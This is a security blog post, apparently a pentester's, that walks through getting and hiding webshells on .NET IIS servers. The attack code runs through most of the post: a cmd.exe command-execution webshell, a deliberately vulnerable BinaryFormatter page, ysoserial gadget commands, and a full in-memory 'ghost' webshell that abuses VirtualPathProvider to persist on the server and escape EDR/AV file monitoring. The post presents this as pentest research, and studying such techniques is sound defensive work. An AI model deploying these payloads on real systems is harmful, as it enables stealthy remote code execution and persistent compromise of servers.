---
title: .NET Webshell
date: 2023-12-26 08:51:00 +0700
categories: [Others]
tags: []
---

Webshell is basically the most common way to get RCE on the target. But that also means we would create new files on the server. Unfortunately, if server has any EDR or AV installed on it, the webshell we uploaded would be deleted or an alert would be noticed to administrator. That restriction leads to memory webshell concept. It is a kind of webshell that would be saved in memory, therefore it would works althought original file had been deleted. In java application, for example one deployed on Tomcat server, we can inject memory web shell in Listener, Filter, ... layers, so is it any technique similar to that in .NET?

While doing pentest/finding 0-days with .NET target, there are some cases i faced about webshell. Before go to details, you can quickly setup a lab for testing

## Setup
I used a VMWare to create a IIS Webserver run on Windows Server 2016 to deploy a website on it. You have to add the following roles and features

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/4789a892-76d7-4fea-93ec-2cc55bff7675)

Download and install Webdeploy from [here](https://www.microsoft.com/en-us/download/details.aspx?id=43717) on the server, then go to services to make sure that Web Management Service is running

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/15b81b48-3568-47bd-975e-1aa2456f13fe)

Now in your local machine, create a MVC web application in Visual Studio, then go to build -> Publish [You project name], then fill the form like the following

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/bc23a6ff-cada-47e6-9cae-20acb4107044)

Then save and publish, your website would be deploy to /rcelab in case of above example

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/79e5e913-4328-4d36-87ad-46908d7aca2e)

## Precompiled application
Some of the application i faced applies precompiled deployment. To setup, in your Visual Studio solution, change publish setting like the following, check [Precompiled during publishing] option, and in Advanced Settings, uncheck the [allow precompiled site to be updatable], then publish again

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/56fff7e1-35f8-4645-bae2-022faa07cdd5)

Now all the .aspx file on the server would look like this

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/e86dbb51-b6d7-4432-b7f2-c3f11efbf27d)

In this condition, even when we can upload a .aspx webshell to the web directory, it could not be executed as expected.

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/f71bca01-44b9-4880-b4b4-a5e3156b2196)

In this case we have to compile our web shell before upload to webserver. To do that, use aspnet_compiler tools, first create webshell in empty folder 

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/6f4cedc6-30e0-4620-b1d1-5cdbc888723f)

Then open Developer Powershell for VS, execute the following command `aspnet_compiler -p [physical path] -v / [out dir]` 

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/217d629e-49ea-4922-9bb4-775481119b24)

Then [out dir] has the following files

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/4464d548-dff7-48a8-bbc0-df1be05c4fe8)

Then upload folder bin to webserver, we can finally execute our webshell

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/1ced33d3-603a-43e2-947f-c1f72cfd3dad)

To sum up, you have to has to combine path traversal with arbitrary file upload, that makes it harder to get shell.

## Deserialize
In case of deserialize, each time we want to execute different command, we have to re-generate payload using ysoserial, then url encode, send request, etc, ... For better use, sometimes people manipulate deserialization to create web shell, but it leads to problem I already said in the overview above. But we really can get shell without creating files on the server with gadget ActivitySurrogateSelectorFromFile already included in ysoserial. This gadget will create an assembly with our custom C# code, then when deserialize, make the server load that assembly.

First create deserialize.aspx for demonstration, this basically decodes base64 in [string] parameter and deserialize the result.

```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Runtime.Serialization.Formatters.Binary" %>

<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    BinaryFormatter binaryFormatter = new BinaryFormatter();
    string base64 = Request["string"];
       if (base64 != null)
            {
                byte[] vs = Convert.FromBase64String(base64);
                MemoryStream stream = new MemoryStream(vs);
                stream.Position = 0;
                binaryFormatter.Deserialize(stream);
            }
}

</script>
```

.NET framework version 4.8+ implements type protections for ActivitySurrogateSelector, so we have to disable it first, send payload generated from the following command via [string] parameter

```bash
ysoserial.exe -f binaryformatter -g ActivitySurrogateDisableTypeCheck -c 123
```

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/fad66618-b37e-48d0-87c4-08227c9b045c)

Create ExploitClass.cs, this class has constructor that get command from [c] parameter then execute it with `cmd /c `

```csharp
// ExploitClass.cs
class E{
    public E()
    {
		//System.Web.HttpContext.Current.Response.StatusCode = System.Convert.ToInt32(System.Web.HttpContext.Current.Request.Cookies["c"].Value);
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
			string dir = context.Server.MapPath("~/") + "/";
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cm"+"d.exe";
            string cmd = context.Request.Form["c"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.WorkingDirectory = dir;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }}
```

Then generate payload with ysoserial, it would create assembly for above class, with dependencies on the rest of [-c] option

```bash
ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll"
```

Put payload to [string] param. Now we can execute any command via [c] parameter

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/43e8f6cc-9882-49f5-b58b-73faa89827ad)

This method allows us to load webshell to the memory and helps our webshell avoid security solutions' observation of file changes on the server. But it's not as powerful as memory shell in Java, because we have to carry deserialization payload in each http request. So if deserialization is somehow patched, our shell is gone. We can bypass this restriction by creating a virtual file (ghost file) by abusing the Virtual Path Provider in .NET. That idea can be done by changing our ExploitClass.cs

```csharp
class G
{
    public G()
    {
        // Author: Soroush Dalili (@irsdl)

        // base64-encoded version of a webshell.aspx file
        string webshellContentsBase64 = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLklPIiAlPgo8c2NyaXB0IExhbmd1YWdlPSJjIyIgcnVuYXQ9InNlcnZlciI+CnZvaWQgUGFnZV9Mb2FkKG9iamVjdCBzZW5kZXIsIEV2ZW50QXJncyBlKQp7CiAgICBSZXNwb25zZS5Xcml0ZShTZXJ2ZXIuSHRtbEVuY29kZShFeGN1dGVDbWQoUmVxdWVzdFsiY21kIl0pKSk7Cn0Kc3RyaW5nIEV4Y3V0ZUNtZChzdHJpbmcgYXJnKQp7CiAgICBQcm9jZXNzU3RhcnRJbmZvIHBzaSA9IG5ldyBQcm9jZXNzU3RhcnRJbmZvKCk7CiAgICBwc2kuRmlsZU5hbWUgPSAiY21kLmV4ZSI7CiAgICBwc2kuQXJndW1lbnRzID0gIi9jICIrYXJnOwogICAgcHNpLlJlZGlyZWN0U3RhbmRhcmRPdXRwdXQgPSB0cnVlOwogICAgcHNpLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOwogICAgUHJvY2VzcyBwID0gUHJvY2Vzcy5TdGFydChwc2kpOwogICAgU3RyZWFtUmVhZGVyIHN0bXJkciA9IHAuU3RhbmRhcmRPdXRwdXQ7CiAgICBzdHJpbmcgcyA9IHN0bXJkci5SZWFkVG9FbmQoKTsKICAgIHN0bXJkci5DbG9zZSgpOwogICAgcmV0dXJuIHM7Cn0Kdm9pZCBjbWRFeGVfQ2xpY2sob2JqZWN0IHNlbmRlciwgU3lzdGVtLkV2ZW50QXJncyBlKQp7CiAgICAvLyBSZXNwb25zZS5Xcml0ZSgiPHByZT4iKTsKICAgIC8vIFJlc3BvbnNlLldyaXRlKFNlcnZlci5IdG1sRW5jb2RlKEV4Y3V0ZUNtZCh0eHRBcmcuVGV4dCkpKTsKICAgIC8vIFJlc3BvbnNlLldyaXRlKCI8L3ByZT4iKTsKfQo8L3NjcmlwdD4=";
        string webshellType = ".aspx";
        string webshellContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(webshellContentsBase64));


        string rootPath = System.Web.HttpContext.Current.Request.CurrentExecutionFilePath.TrimEnd('/').ToLower();
        // removing the application name when making the virtual directory
        int index = rootPath.IndexOf(System.Web.HttpContext.Current.Request.ApplicationPath.ToLower());
        if (index >= 0)
            rootPath = rootPath.Remove(index, System.Web.HttpContext.Current.Request.ApplicationPath.Length);

        // fiddle with targetVirtualPath if needed and you know what path can be used to create the virtual path
        string prefix = "";
        if (rootPath.LastIndexOf("/") > 0)
            prefix = rootPath.Substring(0, rootPath.LastIndexOf("/"));

        string targetVirtualPath = prefix + "/fakepath/";

        targetVirtualPath = targetVirtualPath.Replace("//", "/");


        //System.Web.HttpContext.Current.Response.AddHeader("INFO", System.Web.Compilation.BuildManager.IsPrecompiledApp.ToString()); // info leak
        //System.Web.HttpContext.Current.Response.AddHeader("via", "yso"); // beacon

        try
        {
            //SamplePathProvider sampleProvider = new SamplePathProvider("fakepath1337", @"This is the attacker's file - running on the server if this `<%=1338-1%>` is 1337.");
            SamplePathProvider sampleProvider = new SamplePathProvider(targetVirtualPath, webshellContent);

            // Uncomment this if FriendlyUrlSettings is used! Remember to include Microsoft.AspNet.FriendlyUrls.dll
            
            foreach (var route in System.Web.Routing.RouteTable.Routes)
            {
                
                if (route.GetType().FullName == "Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute")
                {
                    var FriendlySetting = route.GetType().GetProperty("Settings", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);
                    var settings = new Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings();
                    settings.AutoRedirectMode = Microsoft.AspNet.FriendlyUrls.RedirectMode.Off;
                    FriendlySetting.SetValue(route, settings);
                }
            }

            sampleProvider.InitializeLifetimeService(); // we want our web shell to remain there forever (NO. 1)

            System.Reflection.FieldInfo field_isPrecompiledAppComputed = null;
            System.Reflection.FieldInfo field_isPrecompiledApp = null;
            object field_theBuildManager_instance = null;
            object field_isPrecompiledAppComputed_oldValue = null;
            object field_isPrecompiledApp_oldValue = null;


            if (System.Web.Compilation.BuildManager.IsPrecompiledApp)
            {
                // To disable isPrecompiledApp settings
                var typeBuildManager = typeof(System.Web.Compilation.BuildManager);
                System.Reflection.FieldInfo field_theBuildManager = typeBuildManager.GetField("_theBuildManager", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
                field_isPrecompiledAppComputed = typeBuildManager.GetField("_isPrecompiledAppComputed", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
                field_isPrecompiledApp = typeBuildManager.GetField("_isPrecompiledApp", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
                field_theBuildManager_instance = field_theBuildManager.GetValue(null);
                field_isPrecompiledAppComputed_oldValue = field_isPrecompiledAppComputed.GetValue(field_theBuildManager_instance);
                field_isPrecompiledApp_oldValue = field_isPrecompiledApp.GetValue(field_theBuildManager_instance);
                field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, true);
                field_isPrecompiledApp.SetValue(field_theBuildManager_instance, false);
            }

            // IsPrecompiledApp is false!
            System.Web.Hosting.HostingEnvironment.RegisterVirtualPathProvider(sampleProvider);

            if (field_isPrecompiledAppComputed != null)
            {
                // To reverse isPrecompiledApp settings
                field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, field_isPrecompiledAppComputed_oldValue);
                field_isPrecompiledApp.SetValue(field_theBuildManager_instance, field_isPrecompiledApp_oldValue);
            }

            System.Web.HttpContext.Current.Response.Clear();
            System.Web.HttpContext.Current.Response.BufferOutput = true;

            //*
            System.Web.HttpContext.Current.Server.Execute(targetVirtualPath + "shell" + webshellType); // if you need to compile a file immediately
            System.Web.HttpContext.Current.Response.End();

            //*/
            //OR
            /*
            string redirectionTarget = (System.Web.HttpContext.Current.Request.ApplicationPath + targetVirtualPath + "ghostfile" + (new System.Random()).Next(1000) + webshellType).Replace("//", "/");
            System.Web.HttpContext.Current.Response.Redirect(redirectionTarget);
            //*/
        }
        catch (System.Exception error)
        {
            System.Web.HttpContext.Current.Response.AddHeader("Errors", System.Web.HttpUtility.UrlEncode(error.ToString()));
        }
    }

    public class myHandler : System.Web.IHttpHandler, System.Web.Routing.IRouteHandler
    {
        public bool IsReusable
        {
            get { return true; }
        }

        public void ProcessRequest(System.Web.HttpContext context)
        {
            // your processing here
        }

        public System.Web.IHttpHandler GetHttpHandler(System.Web.Routing.RequestContext requestContext)
        {
            return this;
        }
    }
    // Reference: https://docs.microsoft.com/en-us/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8
    public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _fileContent;

        public SamplePathProvider(string virtualDir, string fileContent)
          : base()
        {

            _virtualDir = "/" + virtualDir.Replace(@"\", "/");
            _virtualDir = _virtualDir.Replace("//", "/").TrimEnd('/');

            _fileContent = fileContent;
        }

        protected override void Initialize()
        { }

        private bool IsPathVirtual(string virtualPath)
        {
            //return true; // uncomment this if you need to take over all non-compiled files! this can be very disruptive and can cause DoS
            System.String checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
            return checkPath.ToLower().Contains(_virtualDir.ToLower()); // checkPath.ToLower().Contains(_virtualDir.ToLower()) && checkPath.ToLower().EndsWith(".aspx");
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
            {
                return true;
            }
            else
            {
                return Previous.FileExists(virtualPath);
            }
        }

        public override bool DirectoryExists(string virtualDir)
        {
            if (IsPathVirtual(virtualDir))
            {
                return true;
            }
            else
            {
                return Previous.DirectoryExists(virtualDir);
            }
        }

        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new SampleVirtualFile(virtualPath, _fileContent);
            else
                return Previous.GetFile(virtualPath);
        }


        public override System.Web.Hosting.VirtualDirectory GetDirectory(string virtualDir)
        {
            if (IsPathVirtual(virtualDir))
                return new SampleVirtualDirectory(virtualDir);
            else
                return Previous.GetDirectory(virtualDir);
        }

        public override System.Web.Caching.CacheDependency GetCacheDependency(
          string virtualPath,
          System.Collections.IEnumerable virtualPathDependencies,
          System.DateTime utcStart)
        {
            if (IsPathVirtual(virtualPath))
            {
                /*
                System.Collections.Specialized.StringCollection fullPathDependencies = null;

                // Get the full path to all dependencies.
                foreach (string virtualDependency in virtualPathDependencies)
                {
                    if (fullPathDependencies == null)
                        fullPathDependencies = new System.Collections.Specialized.StringCollection();

                    fullPathDependencies.Add(virtualDependency);
                }
                if (fullPathDependencies == null)
                    return null;

                // Copy the list of full-path dependencies into an array.
                string[] fullPathDependenciesArray = new string[fullPathDependencies.Count];
                fullPathDependencies.CopyTo(fullPathDependenciesArray, 0);
                
                // Copy the virtual path into an array.
                string[] virtualPathArray = new string[1];
                virtualPathArray[0] = @"c:\";

                return new System.Web.Caching.CacheDependency(virtualPathArray, fullPathDependenciesArray, utcStart);
                */

                // we want our web shell to remain  longer than usual! (NO. 2) - uncomment above if you want a shorter expiry
                return new System.Web.Caching.CacheDependency(@"c:\");
            }
            else
            {
                return Previous.GetCacheDependency(virtualPath, virtualPathDependencies, utcStart);
            }
        }
    }

    public class SampleVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _fileContent;
        public bool Exists
        {
            get { return true; }
        }

        public SampleVirtualFile(string virtualPath, string fileContent)
          : base(virtualPath)
        {
            this._fileContent = fileContent;
        }

        public override System.IO.Stream Open()
        {
            System.IO.Stream stream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(_fileContent));
            return stream;
        }
    }

    public class SampleVirtualDirectory : System.Web.Hosting.VirtualDirectory
    {
        public SampleVirtualDirectory(string virtualDir)
          : base(virtualDir)
        {
            string path = virtualDir;

            // System.Web.Hosting.HostingEnvironment.ApplicationVirtualPath or System.Web.HttpContext.Current.Request.ApplicationPath ? */
            if (System.Web.HttpContext.Current.Request.ApplicationPath != "/")
            {
                int index = virtualDir.IndexOf(System.Web.HttpContext.Current.Request.ApplicationPath.ToLower());
                if (index >= 0)
                    path = virtualDir.Remove(index, System.Web.HttpContext.Current.Request.ApplicationPath.Length);
            }

            path = path.TrimEnd('/');

            if (!string.IsNullOrEmpty(path))
            {

                //SampleVirtualDirectory svd = new SampleVirtualDirectory(path);
                children.Add(this);
                directories.Add(this);

                SampleVirtualFile svf = new SampleVirtualFile(path + "/ghostfile.aspx", "");
                children.Add(svf);
                files.Add(svf);
            }
        }

        private System.Collections.ArrayList children = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Children
        {
            get { return children; }
        }

        private System.Collections.ArrayList directories = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Directories
        {
            get { return directories; }
        }

        private System.Collections.ArrayList files = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Files
        {
            get { return files; }
        }
    }
}
```

The file content is got from https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs. My webshell content would be in base64-encoded format

```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    Response.Write(Server.HtmlEncode(ExcuteCmd(Request["cmd"])));
}
string ExcuteCmd(string arg)
{
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+arg;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
    // Response.Write("<pre>");
    // Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
    // Response.Write("</pre>");
}
</script>
```

Since .NET 4.5, web applications can use friendly URLs to not use “.aspx” in the URL when pointing at the ASPX pages. This can stop our method of creating ghost web shells. The following solution was found to overwrite this setting for web applications which used this feature.

```csharp
foreach(var route in System.Web.Routing.RouteTable.Routes)
{
    if (route.GetType().FullName == "Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute") {
        var FriendlySetting = route.GetType().GetProperty("Settings", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);

        var settings = new Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings();
        settings.AutoRedirectMode = Microsoft.AspNet.FriendlyUrls.RedirectMode.Off;

        FriendlySetting.SetValue(route, settings);
        }
}
```

This code has already been included in the GhostWebShell.cs file which needs to be uncommented when required. You also have to install https://www.nuget.org/packages/Microsoft.AspNet.FriendlyUrls package that include Microsoft.AspNet.FriendlyUrls.dll. Now the command to generate deserialize payload is

```bash
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll;D:\code\deser\packages\Microsoft.AspNet.FriendlyUrls.Core.1.0.2\lib\net45\Microsoft.AspNet.FriendlyUrls.dll"
```

Then reproduce previous steps to exploit. Then you can access webshell on /fakepath/shell.aspx

![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/d7230584-8e3b-4262-b9d4-ffd0a3bbb7bf)

